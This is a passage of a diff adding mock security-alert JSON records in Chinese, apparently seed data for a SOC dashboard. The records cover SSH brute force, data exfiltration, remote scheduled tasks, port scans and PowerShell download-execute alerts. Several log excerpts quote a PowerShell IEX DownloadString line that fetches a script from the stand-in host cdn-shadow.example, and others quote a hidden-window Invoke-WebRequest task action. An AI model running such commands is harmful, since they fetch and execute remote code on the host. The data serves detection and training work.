+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-01",
+      "ip": "10.0.0.30",
+      "owner": "财务系统组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T05:24:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-14T05:32:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-14T05:36:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0014",
+    "title": "SSH 暴力破解尝试 #14",
+    "source": "suricata",
+    "severity": "high",
+    "status": "resolved",
+    "timestamp": "2026-04-14T05:19:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "62.171.173.40",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "北美",
+      "country": "美国",
+      "city": "洛杉矶",
+      "latitude": 34.0522,
+      "longitude": -118.2437
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53131,
+      "destination_port": 22,
+      "packet_size": 1023,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 12,
+      "last_7_days": 3,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-14T05:44:00",
+      "response_minutes": 26
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-02",
+      "ip": "10.0.2.15",
+      "owner": "基础设施组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T05:07:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-14T05:15:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-14T05:19:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0015",
+    "title": "异常大流量数据外传 #15",
+    "source": "elk",
+    "severity": "critical",
+    "status": "investigating",
+    "timestamp": "2026-04-14T05:02:00",
+    "rule_name": "NET-Abnormal-Exfiltration",
+    "description": "财务系统服务器在非办公时间向陌生云存储地址持续上传压缩文件。",
+    "log_excerpt": "TLS upload session to report-archive node, stream chunks=248, compressed=true, bytes=184923410",
+    "source_ip": "203.55.18.91",
+    "destination_ip": "10.0.5.22",
+    "source_geo": {
+      "region": "欧洲",
+      "country": "德国",
+      "city": "法兰克福",
+      "latitude": 50.1109,
+      "longitude": 8.6821
+    },
+    "event_type": "可疑外连",
+    "request_content": "PUT /archive/2026/q2/report-pack-14.tar.gz HTTP/1.1\nHost: report-archive.example\nContent-Length: 184923410\nX-Transfer-Mode: bulk-sync",
+    "packet_details": {
+      "protocol": "TLS",
+      "request_method": "PUT",
+      "request_uri": "/archive/2026/q2/report-pack-14.tar.gz",
+      "source_port": 51758,
+      "destination_port": 443,
+      "packet_size": 4244,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "1f 8b 08 00 00 00 00 00 02 ff ec bd 79 7c 14 c5 ..."
+    },
+    "threat_type": "exfiltration",
+    "attack_stage": "Exfiltration",
+    "related_rule_ids": [
+      "RULE-003",
+      "RULE-005"
+    ],
+    "hardening_suggestions": [
+      "限制敏感服务器对外上传目的地",
+      "为数据出口启用 DLP 审计",
+      "对非业务时段大流量传输设置自动阻断"
+    ],
+    "similar_incidents": {
+      "total": 13,
+      "last_7_days": 4,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-14T05:27:00",
+      "response_minutes": 32
+    },
+    "mitre_tactics": [
+      "Collection",
+      "Exfiltration"
+    ],
+    "asset": {
+      "hostname": "asset-03",
+      "ip": "10.0.5.22",
+      "owner": "数据平台组",
+      "environment": "test"
+    },
+    "related_entities": [
+      "finance-app-01",
+      "report-archive",
+      "s3-transfer-gw"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T04:50:00",
+        "message": "检测到异常上传连接"
+      },
+      {
+        "timestamp": "2026-04-14T04:58:00",
+        "message": "传输体积快速上升"
+      },
+      {
+        "timestamp": "2026-04-14T05:02:00",
+        "message": "命中夜间传输告警阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0016",
+    "title": "计划任务横向下发异常 #16",
+    "source": "wazuh",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T04:45:00",
+    "rule_name": "WIN-Remote-Task-Creation",
+    "description": "域内管理主机对多台终端批量创建计划任务，任务内容与标准运维基线不一致。",
+    "log_excerpt": "Remote task creation RPC request -> task=update, schedule=minute, user=svc-backup, cmd=powershell.exe -w hidden",
+    "source_ip": "198.51.100.22",
+    "destination_ip": "10.0.8.90",
+    "source_geo": {
+      "region": "东南亚",
+      "country": "新加坡",
+      "city": "新加坡",
+      "latitude": 1.3521,
+      "longitude": 103.8198
+    },
+    "event_type": "漏洞利用",
+    "request_content": "RPC Task Scheduler CreateTask -> target=ws-224, action=powershell.exe -w hidden -nop -c Invoke-WebRequest",
+    "packet_details": {
+      "protocol": "RPC",
+      "request_method": "CreateTask",
+      "request_uri": "rpc://ws-224/tasks",
+      "source_port": 49903,
+      "destination_port": 445,
+      "packet_size": 1536,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "TaskName=WindowsUpdateCheck\nTrigger=Minute/1\nAction=powershell.exe -w hidden -nop"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Command and Control",
+    "related_rule_ids": [
+      "RULE-004",
+      "RULE-006"
+    ],
+    "hardening_suggestions": [
+      "收敛远程任务创建权限",
+      "审计高权限服务账号使用轨迹",
+      "对隐藏窗口 PowerShell 命令设置拦截规则"
+    ],
+    "similar_incidents": {
+      "total": 14,
+      "last_7_days": 5,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "张晨",
+      "updated_at": "2026-04-14T05:10:00",
+      "response_minutes": 38
+    },
+    "mitre_tactics": [
+      "Lateral Movement",
+      "Persistence"
+    ],
+    "asset": {
+      "hostname": "asset-04",
+      "ip": "10.0.8.90",
+      "owner": "安全运营中心",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "svc-backup",
+      "ops-jump-01",
+      "ws-224"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T04:33:00",
+        "message": "检测到远程计划任务下发"
+      },
+      {
+        "timestamp": "2026-04-14T04:41:00",
+        "message": "任务命令与基线不符"
+      },
+      {
+        "timestamp": "2026-04-14T04:45:00",
+        "message": "受影响终端数量持续增加"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0017",
+    "title": "端口扫描探测 #17",
+    "source": "suricata",
+    "severity": "medium",
+    "status": "new",
+    "timestamp": "2026-04-14T04:28:00",
+    "rule_name": "NET-Port-Scan-Fanout",
+    "description": "单个外部地址对内网多个网段进行快速端口枚举，覆盖常见管理端口。",
+    "log_excerpt": "TCP SYN burst to subnet 10.0.5.0/24 over 22,80,443,3389, fanout=28",
+    "source_ip": "91.214.124.75",
+    "destination_ip": "10.1.1.18",
+    "source_geo": {
+      "region": "东亚",
+      "country": "日本",
+      "city": "东京",
+      "latitude": 35.6762,
+      "longitude": 139.6503
+    },
+    "event_type": "端口扫描",
+    "request_content": "TCP SYN scan burst detected against 10.0.5.0/24 ports 22,80,443,3389",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "SYN",
+      "request_uri": "scan://10.0.5.0/24",
+      "source_port": 42133,
+      "destination_port": 3389,
+      "packet_size": 165,
+      "tcp_flags": "SYN",
+      "payload_preview": "No payload. Repeated SYN packets with incremental destination port fanout."
+    },
+    "threat_type": "port-scan",
+    "attack_stage": "Reconnaissance",
+    "related_rule_ids": [
+      "RULE-005",
+      "RULE-001"
+    ],
+    "hardening_suggestions": [
+      "在边界启用扫描速率限制",
+      "将非常见来源纳入威胁情报封禁",
+      "对暴露服务进行最小化开放"
+    ],
+    "similar_incidents": {
+      "total": 15,
+      "last_7_days": 2,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "李岳",
+      "updated_at": "2026-04-14T04:53:00",
+      "response_minutes": 44
+    },
+    "mitre_tactics": [
+      "Reconnaissance",
+      "Discovery"
+    ],
+    "asset": {
+      "hostname": "asset-05",
+      "ip": "10.1.1.18",
+      "owner": "研发一部",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "scanner-node",
+      "edge-fw-01",
+      "10.0.5.0/24"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T04:16:00",
+        "message": "扫描开始"
+      },
+      {
+        "timestamp": "2026-04-14T04:24:00",
+        "message": "端口覆盖范围扩大"
+      },
+      {
+        "timestamp": "2026-04-14T04:28:00",
+        "message": "频率达到封禁阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0018",
+    "title": "异常登录地理偏移 #18",
+    "source": "elk",
+    "severity": "medium",
+    "status": "resolved",
+    "timestamp": "2026-04-14T04:11:00",
+    "rule_name": "IAM-Improbable-Travel",
+    "description": "同一账号在 20 分钟内先后出现在两个地理位置差异较大的登录事件中。",
+    "log_excerpt": "Account sign-in from Singapore then Frankfurt within 20 minutes for user zhangsan",
+    "source_ip": "103.77.182.16",
+    "destination_ip": "172.16.4.20",
+    "source_geo": {
+      "region": "东欧",
+      "country": "俄罗斯",
+      "city": "莫斯科",
+      "latitude": 55.7558,
+      "longitude": 37.6173
+    },
+    "event_type": "异常登录",
+    "request_content": "POST /api/auth/signin HTTP/1.1\nHost: sso.example\nX-Geo: Frankfurt\nX-User: zhangsan",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/api/auth/signin",
+      "source_port": 50231,
+      "destination_port": 443,
+      "packet_size": 1284,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "username=zhangsan&grant_type=password&device=unknown-browser"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-006",
+      "RULE-002"
+    ],
+    "hardening_suggestions": [
+      "对高风险登录强制二次校验",
+      "梳理账号共享与代维场景",
+      "针对异地登录启用条件访问策略"
+    ],
+    "similar_incidents": {
+      "total": 16,
+      "last_7_days": 3,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "王琪",
+      "updated_at": "2026-04-14T04:36:00",
+      "response_minutes": 50
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Valid Accounts"
+    ],
+    "asset": {
+      "hostname": "asset-06",
+      "ip": "172.16.4.20",
+      "owner": "财务系统组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "zhangsan",
+      "vpn-gateway",
+      "m365-portal"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T03:59:00",
+        "message": "新加坡登录成功"
+      },
+      {
+        "timestamp": "2026-04-14T04:07:00",
+        "message": "法兰克福登录出现"
+      },
+      {
+        "timestamp": "2026-04-14T04:11:00",
+        "message": "触发异地登录规则"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0019",
+    "title": "PowerShell 下载执行异常 #19",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-14T03:54:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "176.65.148.211",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "南亚",
+      "country": "印度",
+      "city": "孟买",
+      "latitude": 19.076,
+      "longitude": 72.8777
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49840,
+      "destination_port": 443,
+      "packet_size": 2957,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 8,
+      "last_7_days": 4,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-14T04:19:00",
+      "response_minutes": 56
+    },
+    "mitre_tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-07",
+      "ip": "10.0.0.30",
+      "owner": "基础设施组",
+      "environment": "test"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T03:42:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-14T03:50:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-14T03:54:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0020",
+    "title": "SSH 暴力破解尝试 #20",
+    "source": "suricata",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T03:37:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "45.142.214.8",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "南美",
+      "country": "巴西",
+      "city": "圣保罗",
+      "latitude": -23.5505,
+      "longitude": -46.6333
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53137,
+      "destination_port": 22,
+      "packet_size": 1060,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
+      "对 SSH 开启来源白名单",
+      "将高频失败源加入临时封禁策略"
+    ],
+    "similar_incidents": {
+      "total": 9,
+      "last_7_days": 5,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-14T04:02:00",
+      "response_minutes": 62
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Initial Access"
+    ],
+    "asset": {
+      "hostname": "asset-08",
+      "ip": "10.0.2.15",
+      "owner": "数据平台组",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "admin",
+      "bastion-02",
+      "185.233.44.12"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T03:25:00",
+        "message": "首次失败登录"
+      },
+      {
+        "timestamp": "2026-04-14T03:33:00",
+        "message": "触发账号锁定阈值"
+      },
+      {
+        "timestamp": "2026-04-14T03:37:00",
+        "message": "同源继续尝试其他主机"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0021",
+    "title": "异常大流量数据外传 #21",
+    "source": "elk",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-14T03:20:00",
+    "rule_name": "NET-Abnormal-Exfiltration",
+    "description": "财务系统服务器在非办公时间向陌生云存储地址持续上传压缩文件。",
+    "log_excerpt": "TLS upload session to report-archive node, stream chunks=248, compressed=true, bytes=184923410",
+    "source_ip": "100.20.10.5",
+    "destination_ip": "10.0.5.22",
+    "source_geo": {
+      "region": "华北",
+      "country": "中国",
+      "city": "北京",
+      "latitude": 39.9042,
+      "longitude": 116.4074
+    },
+    "event_type": "可疑外连",
+    "request_content": "PUT /archive/2026/q2/report-pack-14.tar.gz HTTP/1.1\nHost: report-archive.example\nContent-Length: 184923410\nX-Transfer-Mode: bulk-sync",
+    "packet_details": {
+      "protocol": "TLS",
+      "request_method": "PUT",
+      "request_uri": "/archive/2026/q2/report-pack-14.tar.gz",
+      "source_port": 51764,
+      "destination_port": 443,
+      "packet_size": 4096,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "1f 8b 08 00 00 00 00 00 02 ff ec bd 79 7c 14 c5 ..."
+    },
+    "threat_type": "exfiltration",
+    "attack_stage": "Exfiltration",
+    "related_rule_ids": [
+      "RULE-003",
+      "RULE-005"
+    ],
+    "hardening_suggestions": [
+      "限制敏感服务器对外上传目的地",
+      "为数据出口启用 DLP 审计",
+      "对非业务时段大流量传输设置自动阻断"
+    ],
+    "similar_incidents": {
+      "total": 10,
+      "last_7_days": 2,
+      "closed_rate": 0.52
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "张晨",
+      "updated_at": "2026-04-14T03:45:00",
+      "response_minutes": 8
+    },
+    "mitre_tactics": [
+      "Collection",
+      "Exfiltration"
+    ],
+    "asset": {
+      "hostname": "asset-09",
+      "ip": "10.0.5.22",
+      "owner": "安全运营中心",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "finance-app-01",
+      "report-archive",
+      "s3-transfer-gw"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T03:08:00",
+        "message": "检测到异常上传连接"
+      },
+      {
+        "timestamp": "2026-04-14T03:16:00",
+        "message": "传输体积快速上升"
+      },
+      {
+        "timestamp": "2026-04-14T03:20:00",
+        "message": "命中夜间传输告警阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0022",
+    "title": "计划任务横向下发异常 #22",
+    "source": "wazuh",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T03:03:00",
+    "rule_name": "WIN-Remote-Task-Creation",
+    "description": "域内管理主机对多台终端批量创建计划任务，任务内容与标准运维基线不一致。",
+    "log_excerpt": "Remote task creation RPC request -> task=update, schedule=minute, user=svc-backup, cmd=powershell.exe -w hidden",
+    "source_ip": "185.233.44.12",
+    "destination_ip": "10.0.8.90",
+    "source_geo": {
+      "region": "华东",
+      "country": "中国",
+      "city": "上海",
+      "latitude": 31.2304,
+      "longitude": 121.4737
+    },
+    "event_type": "漏洞利用",
+    "request_content": "RPC Task Scheduler CreateTask -> target=ws-224, action=powershell.exe -w hidden -nop -c Invoke-WebRequest",
+    "packet_details": {
+      "protocol": "RPC",
+      "request_method": "CreateTask",
+      "request_uri": "rpc://ws-224/tasks",
+      "source_port": 49909,
+      "destination_port": 445,
+      "packet_size": 1573,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "TaskName=WindowsUpdateCheck\nTrigger=Minute/1\nAction=powershell.exe -w hidden -nop"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Command and Control",
+    "related_rule_ids": [
+      "RULE-004",
+      "RULE-006"
+    ],
+    "hardening_suggestions": [
+      "收敛远程任务创建权限",
+      "审计高权限服务账号使用轨迹",
+      "对隐藏窗口 PowerShell 命令设置拦截规则"
+    ],
+    "similar_incidents": {
+      "total": 11,
+      "last_7_days": 3,
+      "closed_rate": 0.6
+    },
+    "ticket": {
+      "status": "processing",
+      "assignee": "李岳",
+      "updated_at": "2026-04-14T03:28:00",
+      "response_minutes": 14
+    },
+    "mitre_tactics": [
+      "Lateral Movement",
+      "Persistence"
+    ],
+    "asset": {
+      "hostname": "asset-10",
+      "ip": "10.0.8.90",
+      "owner": "研发一部",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-backup",
+      "ops-jump-01",
+      "ws-224"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T02:51:00",
+        "message": "检测到远程计划任务下发"
+      },
+      {
+        "timestamp": "2026-04-14T02:59:00",
+        "message": "任务命令与基线不符"
+      },
+      {
+        "timestamp": "2026-04-14T03:03:00",
+        "message": "受影响终端数量持续增加"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0023",
+    "title": "端口扫描探测 #23",
+    "source": "suricata",
+    "severity": "medium",
+    "status": "new",
+    "timestamp": "2026-04-14T02:46:00",
+    "rule_name": "NET-Port-Scan-Fanout",
+    "description": "单个外部地址对内网多个网段进行快速端口枚举，覆盖常见管理端口。",
+    "log_excerpt": "TCP SYN burst to subnet 10.0.5.0/24 over 22,80,443,3389, fanout=28",
+    "source_ip": "45.83.91.201",
+    "destination_ip": "10.1.1.18",
+    "source_geo": {
+      "region": "华南",
+      "country": "中国",
+      "city": "深圳",
+      "latitude": 22.5431,
+      "longitude": 114.0579
+    },
+    "event_type": "端口扫描",
+    "request_content": "TCP SYN scan burst detected against 10.0.5.0/24 ports 22,80,443,3389",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "SYN",
+      "request_uri": "scan://10.0.5.0/24",
+      "source_port": 42139,
+      "destination_port": 3389,
+      "packet_size": 202,
+      "tcp_flags": "SYN",
+      "payload_preview": "No payload. Repeated SYN packets with incremental destination port fanout."
+    },
+    "threat_type": "port-scan",
+    "attack_stage": "Reconnaissance",
+    "related_rule_ids": [
+      "RULE-005",
+      "RULE-001"
+    ],
+    "hardening_suggestions": [
+      "在边界启用扫描速率限制",
+      "将非常见来源纳入威胁情报封禁",
+      "对暴露服务进行最小化开放"
+    ],
+    "similar_incidents": {
+      "total": 12,
+      "last_7_days": 4,
+      "closed_rate": 0.68
+    },
+    "ticket": {
+      "status": "closed",
+      "assignee": "王琪",
+      "updated_at": "2026-04-14T03:11:00",
+      "response_minutes": 20
+    },
+    "mitre_tactics": [
+      "Reconnaissance",
+      "Discovery"
+    ],
+    "asset": {
+      "hostname": "asset-11",
+      "ip": "10.1.1.18",
+      "owner": "财务系统组",
+      "environment": "test"
+    },
+    "related_entities": [
+      "scanner-node",
+      "edge-fw-01",
+      "10.0.5.0/24"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T02:34:00",
+        "message": "扫描开始"
+      },
+      {
+        "timestamp": "2026-04-14T02:42:00",
+        "message": "端口覆盖范围扩大"
+      },
+      {
+        "timestamp": "2026-04-14T02:46:00",
+        "message": "频率达到封禁阈值"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0024",
+    "title": "异常登录地理偏移 #24",
+    "source": "elk",
+    "severity": "medium",
+    "status": "resolved",
+    "timestamp": "2026-04-14T02:29:00",
+    "rule_name": "IAM-Improbable-Travel",
+    "description": "同一账号在 20 分钟内先后出现在两个地理位置差异较大的登录事件中。",
+    "log_excerpt": "Account sign-in from Singapore then Frankfurt within 20 minutes for user zhangsan",
+    "source_ip": "62.171.173.40",
+    "destination_ip": "172.16.4.20",
+    "source_geo": {
+      "region": "北美",
+      "country": "美国",
+      "city": "洛杉矶",
+      "latitude": 34.0522,
+      "longitude": -118.2437
+    },
+    "event_type": "异常登录",
+    "request_content": "POST /api/auth/signin HTTP/1.1\nHost: sso.example\nX-Geo: Frankfurt\nX-User: zhangsan",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/api/auth/signin",
+      "source_port": 50237,
+      "destination_port": 443,
+      "packet_size": 1321,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "username=zhangsan&grant_type=password&device=unknown-browser"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-006",
+      "RULE-002"
+    ],
+    "hardening_suggestions": [
+      "对高风险登录强制二次校验",
+      "梳理账号共享与代维场景",
+      "针对异地登录启用条件访问策略"
+    ],
+    "similar_incidents": {
+      "total": 13,
+      "last_7_days": 5,
+      "closed_rate": 0.76
+    },
+    "ticket": {
+      "status": "ignored",
+      "assignee": "SOC值班",
+      "updated_at": "2026-04-14T02:54:00",
+      "response_minutes": 26
+    },
+    "mitre_tactics": [
+      "Credential Access",
+      "Valid Accounts"
+    ],
+    "asset": {
+      "hostname": "asset-12",
+      "ip": "172.16.4.20",
+      "owner": "基础设施组",
+      "environment": "dev"
+    },
+    "related_entities": [
+      "zhangsan",
+      "vpn-gateway",
+      "m365-portal"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T02:17:00",
+        "message": "新加坡登录成功"
+      },
+      {
+        "timestamp": "2026-04-14T02:25:00",
+        "message": "法兰克福登录出现"
+      },
+      {
+        "timestamp": "2026-04-14T02:29:00",
+        "message": "触发异地登录规则"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0025",
+    "title": "PowerShell 下载执行异常 #25",
+    "source": "wazuh",
+    "severity": "critical",
+    "status": "new",
+    "timestamp": "2026-04-14T02:12:00",
+    "rule_name": "WIN-Powershell-EncodedCommand",
+    "description": "终端主机检测到 PowerShell 使用编码参数从外部地址下载并执行脚本。",
+    "log_excerpt": "powershell.exe -EncodedCommand JABXAGM... IEX(New-Object Net.WebClient).DownloadString('http://cdn-shadow.example/a.ps1')",
+    "source_ip": "203.55.18.91",
+    "destination_ip": "10.0.0.30",
+    "source_geo": {
+      "region": "欧洲",
+      "country": "德国",
+      "city": "法兰克福",
+      "latitude": 50.1109,
+      "longitude": 8.6821
+    },
+    "event_type": "恶意文件",
+    "request_content": "POST /sync/agent HTTP/1.1\nHost: cdn-shadow.example\nUser-Agent: powershell/7.4\nContent-Type: application/octet-stream\nX-Task: bootstrap",
+    "packet_details": {
+      "protocol": "HTTPS",
+      "request_method": "POST",
+      "request_uri": "/sync/agent",
+      "source_port": 49846,
+      "destination_port": 443,
+      "packet_size": 2994,
+      "tcp_flags": "PSH,ACK",
+      "payload_preview": "0000  50 53 31 3a 20 49 45 58 28 4e 65 77 2d 4f 62 6a\n0010  65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e"
+    },
+    "threat_type": "c2",
+    "attack_stage": "Execution",
+    "related_rule_ids": [
+      "RULE-001",
+      "RULE-003"
+    ],
+    "hardening_suggestions": [
+      "限制 PowerShell 编码命令执行",
+      "启用 AppLocker 或 WDAC 白名单",
+      "对主机出站流量增加域名信誉校验"
+    ],
+    "similar_incidents": {
+      "total": 14,
+      "last_7_days": 2,
+      "closed_rate": 0.84
+    },
+    "ticket": {
+      "status": "pending",
+      "assignee": "蓝队一组",
+      "updated_at": "2026-04-14T02:37:00",
+      "response_minutes": 32
+    },
+    "mitre_tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "asset": {
+      "hostname": "asset-01",
+      "ip": "10.0.0.30",
+      "owner": "数据平台组",
+      "environment": "prod"
+    },
+    "related_entities": [
+      "svc-patch",
+      "host-win-01",
+      "cdn-shadow.example"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-04-14T02:00:00",
+        "message": "PowerShell 进程启动"
+      },
+      {
+        "timestamp": "2026-04-14T02:08:00",
+        "message": "发起外联下载"
+      },
+      {
+        "timestamp": "2026-04-14T02:12:00",
+        "message": "疑似脚本落地执行"
+      }
+    ]
+  },
+  {
+    "id": "ALT-2026-0026",
+    "title": "SSH 暴力破解尝试 #26",
+    "source": "suricata",
+    "severity": "high",
+    "status": "investigating",
+    "timestamp": "2026-04-14T01:55:00",
+    "rule_name": "LINUX-SSH-Bruteforce",
+    "description": "边界流量中检测到单个源地址在短时间内对多台 Linux 主机进行高频口令尝试。",
+    "log_excerpt": "sshd[2291]: Failed password for admin from 185.233.44.12 port 53118 ssh2",
+    "source_ip": "198.51.100.22",
+    "destination_ip": "10.0.2.15",
+    "source_geo": {
+      "region": "东南亚",
+      "country": "新加坡",
+      "city": "新加坡",
+      "latitude": 1.3521,
+      "longitude": 103.8198
+    },
+    "event_type": "暴力破解",
+    "request_content": "SSH auth attempt -> user=admin, auth_method=password, retries=16, target=bastion-02",
+    "packet_details": {
+      "protocol": "TCP",
+      "request_method": "AUTH",
+      "request_uri": "ssh://bastion-02:22",
+      "source_port": 53143,
+      "destination_port": 22,
+      "packet_size": 912,
+      "tcp_flags": "SYN,ACK",
+      "payload_preview": "SSH-2.0-OpenSSH_8.9\nKey exchange init\nUser auth request: admin/password"
+    },
+    "threat_type": "brute-force",
+    "attack_stage": "Initial Access",
+    "related_rule_ids": [
+      "RULE-002",
+      "RULE-004"
+    ],
+    "hardening_suggestions": [
+      "启用 MFA 并关闭密码直连",
